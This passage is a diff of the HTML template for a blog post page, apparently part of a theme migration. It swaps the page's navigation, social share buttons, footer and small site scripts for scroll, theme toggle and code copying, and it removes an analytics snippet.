-<span class=button__icon>→</span>
+<a class=next href=https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/>
+<span class=title>Next Page »</span>
+<br>
+<span>Beating Xerxes2</span>
 </a>
-</span>
-</div>
-</div>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share taming the troll on twitter" href="https://twitter.com/intent/tweet/?text=taming%20the%20troll&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share taming the troll on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f&title=taming%20the%20troll&summary=taming%20the%20troll&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share taming the troll on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f&title=taming%20the%20troll"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share taming the troll on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share taming the troll on whatsapp" href="https://api.whatsapp.com/send?text=taming%20the%20troll%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share taming the troll on telegram" href="https://telegram.me/share/url?text=taming%20the%20troll&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
 </div>
 </footer>
-<script src=https://leonjza.github.io/assets/main.js></script>
-<script src=https://leonjza.github.io/assets/prism.js></script>
-</div>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
+</article>
+</main>
+<footer class=footer>
+<span>@leonjza</span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
 </body>
 </html>
